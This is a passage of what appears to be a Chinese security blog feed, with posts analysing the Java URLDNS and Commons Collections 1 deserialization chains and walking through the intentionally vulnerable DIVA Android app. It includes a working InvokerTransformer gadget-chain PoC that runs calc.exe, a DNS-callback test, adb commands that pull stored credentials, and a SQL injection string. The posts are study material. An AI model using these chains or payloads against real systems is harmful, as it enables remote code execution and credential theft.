<code>handler.hashCode(this)</code>，URLDNS链中也通过反射将<code>hashCode</code>的值设置为-1，也就是URLDNS的<code>getObject</code></p><p><code>()</code>方法中设置<code>hashCode</code>为-1的原因了。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324150612449-2075497477.png" alt="image-20220324150611827"></p><p>看一下<code>handler</code>，是<code>URLStreamHandler</code>类（也是我们传入的<code>handler</code>），就是上面<code>URLStreamHandler</code>对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324164600472-371298152.png" alt="image-20220324164559978"></p><p>也就是说这里调用的是<code>URLStreamHandler.hashCode()</code>方法，跟进<code>hashCode()</code>方法，发现这里调用了<code>getHostAddress()</code>方法，见名思意就知道这里是做DNS查询</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324165008570-1888846719.png" alt="image-20220324165008096"></p><p>跟进<code>getHostAddress()</code>方法，发现会调用<code>getHost()</code>方法发起DNS请求</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324165205257-1212792639.png" alt="image-20220324165204708"></p><p>到此就结束了，调用链如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220324165333846-1590120445.png" alt="image-20220324165333365"></p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>分析过程中，发现<code>HashMap.put()</code>方法中也调用了<code>hash()</code>方法，然后去进行hashCode计算等</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325093950582-682409755.png" alt="image-20220325093950339"></p><p>那么就是说，在put操作的时候，也会触发对应的DNS解析，编写测试代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325094032155-510254520.png" alt="image-20220325094032461"></p><p>成功解析DNS</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325094056740-1827988877.png" alt="image-20220325094056984"></p><p>但是，ysoserial在生成序列化数据的时候却并没有收到DNS解析，原因就在于继承抽象类<code>URLStreamHandler</code>的<code>SilentURLStreamHandler</code>类中，重写了<code>openConnection()</code>和<code>getHostAddress()</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325094453594-1926599809.png" alt="image-20220325094453830"></p><p>因此在调用 put 方法的时候不会触发DNS 查询，下面编写测试代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class UrlDNStest2 &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException &#123;</span><br><span class="line">        URLStreamHandler urlStreamHandler = new URLStreamHandler()&#123;</span><br><span class="line">            @Override</span><br><span class="line">            protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">            @Override</span><br><span class="line">            protected synchronized InetAddress getHostAddress(URL u)&#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(null, &quot;http://p8v57z.dnslog.cn&quot;, urlStreamHandler);</span><br><span class="line">        map.put(url, 2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325095447334-755455461.png" alt="image-20220325095447625"></p><p>根据之前分析之所以会产生后面的DNS解析的一个关键是<code>URL.hashCode</code>的值是-1，那么要想让<code>put()</code>方法不产生DNS解析，可以在put方法之前设置<code>hashCode</code>为一个不为-1的值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325105209097-556002660.png" alt="image-20220325105209379"></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325105151233-82525919.png" alt="image-20220325105151582"></p><p>那为什么反序列化之后又可以进行DNS解析呢，这里查看URL类的源码，可以看到<code>handler</code>属性被设置为了<code>transient</code>，在反射的学习中可以知道，被设置了<code>transient</code>的是无法被序列化的，所以序列化的时候没有DNS解析。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220325102243366-328457133.png" alt="image-20220325102243557"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>整个调用链梳理下就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt; HashMap.putVal() -&gt; HashMap.hash() -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode().getHostAddress() -&gt; URLStreamHandler.getHostAddress().InetAddress.getByName()</span><br></pre></td></tr></table></figure><p>可能存在反序列化漏洞的形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.入口类的readObject直接调用危险方法。</span><br><span class="line">2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</span><br><span class="line">3.入口类参数中包含可控类，该类又调用其他危险方法的类，readObject时调用。</span><br><span class="line">比如类型定义为Object，调用equals/hashCode/toString方法等。重点相同类型，同名函数。</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html#0x03-urldns%E9%93%BE%E5%88%86%E6%9E%90">Java安全之URLDNS链 - nice_0e3 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/117235572">https://blog.csdn.net/solitudi/article/details/117235572</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;URLDNS链是ysoserial里面的一条简单的利用链，但URLDNS的利用效果是只能触发一次DNS请求，而不能去执行命令，比较适用于漏洞验证这一块。而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="URLDNS" scheme="https://kpa1on.github.io/tags/URLDNS/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections1分析前置知识</title>
    <link href="https://kpa1on.github.io/2022/03/23/Commons-Collections1%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"/>
    <id>https://kpa1on.github.io/2022/03/23/Commons-Collections1%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</id>
    <published>2022-03-23T02:38:42.000Z</published>
    <updated>2022-03-23T11:02:26.685Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Commons Collections</code>的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。<code>Apache Commons Collections</code>是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JDK版本：jdk1.8以前（8u71之后已修复不可利用）</span><br><span class="line">CC版本：Commons-Collections 3.1-3.2.1</span><br></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>看下poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformerChina</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果成功执行命令，先来说下原因：首先利用<code>ChainedTransformer</code>类构建一个<code>Transformer</code>链，通过调用多个Transformer类来造成命令执行；当调用<code>ChainedTransformer.transform()</code>时，会把<code>Transformer[]</code>数组中的所有<code>Transformer</code>依次执行<code>transform()</code>方法，而且这里每个<code>transform()</code>方法执行后的结果被传递给第二个<code>Transformer</code>去执行<code>transform()</code>方法，所以造成命令执行。以上代码相当于这一行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().getClass().getMethod(&quot;exec&quot;,new </span><br><span class="line">Class[]&#123;String.class&#125;).invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323113633723-703888015.png" alt="image-20220323113632899"></p><p>在调试调用链的时候，会接触到一些没接触过的类，先了解下这些类的作用。</p><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p><code>Transformer</code>是<code>Commons Collections</code>中提供的一个接口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323123755936-52589905.png" alt="image-20220323123754968"></p><p>根据注释可以了解到，<code>Transformer</code> 定义由将一个对象转换为另一个对象的类实现的仿函数接口。 <code>Transformer</code> 将输入对象转换为输出对象，输入对象应保持不变。 <code>Transformer</code> 通常用于类型转换或从对象中提取数据。</p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code>是<code>Transformer</code>的实现类，注释中解释说“每次返回相同常量的转换器实现，不检查对象是否不可变。通常，只有不可变对象才应该使用常量工厂，可变对象应该使用原型工厂”。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143526760-1572607252.png" alt="image-20220323143526180"></p><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code>也是<code>Transformer</code>的实现类，作用是通过反射创建一个新对象实例的<code>Transformer</code>实现。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143651333-1091631069.png" alt="image-20220323143650924"></p><p>在构造方法中有三个参数，第一个参数是待执行的方法名，第二个参数<br>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表 。</p><p>里面还有个<code>transform</code>的方法，代码很明显，该方法可以通过Java反射机制来进行执行任意代码。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323145022998-2014512859.png" alt="image-20220323145022528"></p><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code>也是实现了<code>Transformer</code>接口的⼀个类，作用是可以实现将指定的<code>Transformer</code>链接在一起。输入对象被传递给第一个<code>Transformer</code>，输出后的结果被传递给第二个<code>Transformer</code>，依此类推。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323150705722-1852287205.png" alt="image-20220323150705192"></p><p>注意到<code>ChainedTransformer</code>有个<code>transform</code>方法，该方法的作用是将每个<code>Transformer</code>的输入转换为结果，这里会遍历<code>transform</code>数组。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323151522263-1798028772.png" alt="image-20220323151521930"></p><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>利用<code>Transformer</code>来执行命令需要绑定到Map上，抽象类<code>AbstractMapDecorator</code>是<code>Apache Commons Collections</code>提供的一个类，实现类有很多，比如<code>LazyMap</code>、<code>TransformedMap</code>等，这些类都有一个<code>decorate()</code>方法，用于将上述的<code>Transformer</code>实现类绑定到Map上，当对Map进行一些操作时，如修改数据，会自动触发<code>Transformer</code>实现类的<code>tranform()</code>方法，不同的Map类型有不同的触发规则。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323153425618-474630593.png" alt="image-20220323153425166"></p><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>之前我们在poc里写了如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //给予map数据转化链</span><br></pre></td></tr></table></figure><p>跟踪下就可以知道，通过<code>TransformedMap.decorate()</code>方法将<code>Transformer</code>实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法。我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时，就会自动触发<code>chainedtransformer.transform()</code>方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323155612605-743381297.png" alt="image-20220323155612177"></p><p>下面简单分析下执行流程</p><p>先编写一个测试用例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Mytransform implements Transformer &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    public Mytransform(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        System.out.println(&quot;in myTransformer ：transform()&quot;);</span><br><span class="line">        System.out.println(&quot;input is &quot; + input);</span><br><span class="line">        return this.name;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Transformer getinstance(String name) &#123;</span><br><span class="line">        return new Mytransform(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Mytransform mytransform = (Mytransform) Mytransform.getinstance(&quot;sec&quot;);</span><br><span class="line">        HashMap objectObjectHashMap = new HashMap();</span><br><span class="line">        objectObjectHashMap.put(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">        objectObjectHashMap.put(&quot;key2&quot;, &quot;value2&quot;);</span><br><span class="line">        Map map = TransformedMap.decorate(objectObjectHashMap, null, mytransform);</span><br><span class="line">        Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;new1&quot;);</span><br><span class="line">        System.out.println(objectObjectHashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170657843-464346168.png" alt="image-20220323170657299"></p><p>在<code>setValue</code>处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170721169-1610215049.png" alt="image-20220323170720926"></p><p>点击调式</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170809103-262640445.png" alt="image-20220323170808590"></p><p>进入<code>setValue</code>方法中，这里会将value值传递给<code>checkSetValue()</code>方法中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170847433-789972894.png" alt="image-20220323170847068"></p><p>跟进<code>checkSetValue()</code>方法，到这里已经和上面我们得出的结论一致了，它会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法，这里的<code>valueTransformer</code>是在<code>TransformedMap.decorate</code>中将<code>mytransform</code>赋值给它的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170943956-2034361576.png" alt="image-20220323170943534"></p><p>跟进，就进入了我们重写的<code>transform</code>方法中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323171354657-400333195.png" alt="image-20220323171354317"></p><p>以上就是一些前置知识。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap">https://www.cnblogs.com/litlife/p/12571787.html#transformedmap</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13758664.html#transformer">https://www.cnblogs.com/nice0e3/p/13758664.html#transformer</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Commons Collections&lt;/code&gt;的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。&lt;code&gt;Apache Commons Collections&lt;/code&gt;是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="cc链" scheme="https://kpa1on.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>APP测试-DIVA</title>
    <link href="https://kpa1on.github.io/2022/03/22/APP%E6%B5%8B%E8%AF%95-DIVA/"/>
    <id>https://kpa1on.github.io/2022/03/22/APP%E6%B5%8B%E8%AF%95-DIVA/</id>
    <published>2022-03-22T10:16:08.000Z</published>
    <updated>2022-03-22T16:15:38.072Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="DIVA简介"><a href="#DIVA简介" class="headerlink" title="DIVA简介"></a>DIVA简介</h3><p>DIVA（该死的不安全和易受攻击的应用程序）是故意设计的存在很多漏洞的Android app。</p><span id="more"></span><p>源代码链接：<a href="https://github.com/payatu/diva-android">https://github.com/payatu/diva-android</a></p><p>apk文件链接：<a href="http://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz">http://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>逍遥模拟器</li><li>JDK1.8</li><li>Apktool</li><li>dex2jar、jd-gui、Android-Killer</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>adb连接模拟器，adb.exe connect 127.0.0.1:21503，报错，原因是开放了另一个端口</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322182127651-1709294793.png" alt="image-20220322182127434"></p><p>换个端口就好了，因为有多个模拟器，占用的端口不一样</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322183553532-1260709617.png" alt="image-20220322183554442"></p><p>将apk放进模拟器，打开</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322182504954-46243243.png" alt="image-20220322182505484"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="第一关-不安全的日志输出"><a href="#第一关-不安全的日志输出" class="headerlink" title="第一关 不安全的日志输出"></a>第一关 不安全的日志输出</h4><p>产生原因：由于app代码中将敏感信息（如凭据，会话ID，财务详细信息等）通过log.e输出，所以在app的表单中输入的内容，可以在相关的日志中输出。</p><p>这里模拟输入敏感信息“111”</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322183611807-1401167450.png" alt="image-20220322183612462"></p><p>通过<code>adb logcat</code>查看运行日志</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322183706432-1875151932.png" alt="image-20220322183707309"></p><p>把apk文件拖到Android-Killer，然后还原java代码，在<code>LogActivity#checkout</code>方法中发现，会将用户输入的credit输出到日志中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184235923-1347215088.png" alt="image-20220322184236504"></p><h4 id="第二关-硬编码-第一部分"><a href="#第二关-硬编码-第一部分" class="headerlink" title="第二关 硬编码-第一部分"></a>第二关 硬编码-第一部分</h4><p>硬编码是将数据直接嵌入到程序或其他可执行对象的源代码中的软件开发实践，与从外部获取数据或在运行时生成数据不同。 </p><p>随便输入</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184605652-1512158428.png" alt="image-20220322184606248"></p><p>然后定位到源码<code>HardcodeActivity#access</code>方法中，发现vendor key的值</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184651189-182372022.png" alt="image-20220322184651281"></p><p>提交</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184736454-1262318612.png" alt="image-20220322184737128"></p><h4 id="第三关-不安全的数据存储-第一部分"><a href="#第三关-不安全的数据存储-第一部分" class="headerlink" title="第三关 不安全的数据存储-第一部分"></a>第三关 不安全的数据存储-第一部分</h4><p>产生原因：使用了<code>SharedPreferences</code>类，该类是Android平台上一个轻量级的存储类，主要是用来保存一些常用的配置，本例中是用该类存储了用户名和密码，因此是具有风险的。<code>SharedPreferences</code>类存储的数据会以.xml的形式存储在&#x2F;data&#x2F;data&#x2F;app的包名&#x2F;shared_prefs目录下。</p><p>首先随意输入用户名和密码点击保存</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184924698-1218298847.png" alt="image-20220322184924591"></p><p>进入shell模式，在&#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;shared_prefs&#x2F;目录中查看jakhar.aseem.diva_preferences.xml文件，也可以输入adb pull &#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;shared_prefs .&#x2F;将文件复制出来查看，发现文件中保存了刚刚输入的用户名和密码。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322185106189-1658036911.png" alt="image-20220322185107256"></p><p>查看源码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322185224730-2122017400.png" alt="image-20220322185225572"></p><h4 id="第四关-不安全的数据存储-第二部分"><a href="#第四关-不安全的数据存储-第二部分" class="headerlink" title="第四关 不安全的数据存储-第二部分"></a>第四关 不安全的数据存储-第二部分</h4><p>产生原因：将敏感数据保存在本地的sqlite3数据库中，对应的数据库目录: &#x2F;data&#x2F;data&#x2F;app的包名&#x2F;databases</p><p>输入用户名和密码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322185333786-597081479.png" alt="image-20220322185334417"></p><p>进入&#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;databases&#x2F;目录中，将数据库文件ids2下载到本地，<code>adb pull /data/data/jakhar.aseem.diva/databases/ids2 .</code>，使用sqlite数据库管理工具打开即可查看到保存的用户名和密码。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322213625748-1287546810.png" alt="image-20220322213625717"></p><p>在<code>InsecureDataStorage2Activity#saveCredentials</code>中可以看到，将输入的用户名和密码插入到sqlite3数据库。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322214059131-1473243306.png" alt="image-20220322214059563"></p><h4 id="第五关-不安全的数据存储-第三部分"><a href="#第五关-不安全的数据存储-第三部分" class="headerlink" title="第五关 不安全的数据存储-第三部分"></a>第五关 不安全的数据存储-第三部分</h4><p>产生原因：将敏感数据保存在临时文件中，对应的临时文件目录: &#x2F;data&#x2F;data&#x2F;app的包名&#x2F;</p><p>输入用户名和密码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322214604404-1922986992.png" alt="image-20220322214605016"></p><p>进入&#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;目录中查看该目录下临时文件uinfo-1161629033tmp</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322214838647-178846512.png" alt="image-20220322214839395"></p><p>查看源码，在<code>InsecureDataStorage3Activity#saveCredentials</code>，代码将用户的输入保存到tmp文件中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215121757-1535698173.png" alt="image-20220322215122161"></p><h4 id="第六关-不安全的数据存储-第四部分"><a href="#第六关-不安全的数据存储-第四部分" class="headerlink" title="第六关 不安全的数据存储-第四部分"></a>第六关 不安全的数据存储-第四部分</h4><p> 产生原因：将敏感数据保存在sd卡中，对应的目录一般在：&#x2F;mnt&#x2F;sdcard，也可以通过logcat查看保存路径。</p><p>输入用户名和密码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215319072-1894776264.png" alt="image-20220322215319664"></p><p>进入&#x2F;mnt&#x2F;sdcard&#x2F;目录中，查看文件.unifo.txt</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215455294-52795390.png" alt="image-20220322215456142"></p><p>查看源码，在<code>InsecureDataStorage4Activity#saveCredentials</code>，代码将用户名和密码保存在sd卡的.uinfo.txt文件中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215658926-1701769296.png" alt="image-20220322215659410"></p><h4 id="第七关-输入校验问题-第一部分"><a href="#第七关-输入校验问题-第一部分" class="headerlink" title="第七关 输入校验问题-第一部分"></a>第七关 输入校验问题-第一部分</h4><p>产生原因：某些不安全控件内输入sql或其他数据库的一些语句，因为在使用前未进行检验长度和过滤等操作，从而达到欺骗服务器执行恶意代码影响到数据库的数据。</p><p>首先输入test’和test’’试探一下，test’什么也不返回，而test’’会返回”not found”</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322220405275-20108047.png" alt="image-20220322220405444"></p><p>输入万能密码<code>test&#39; or &#39;1&#39;=&#39;1</code>尝试，返回了所有用户的数据</p><p><img 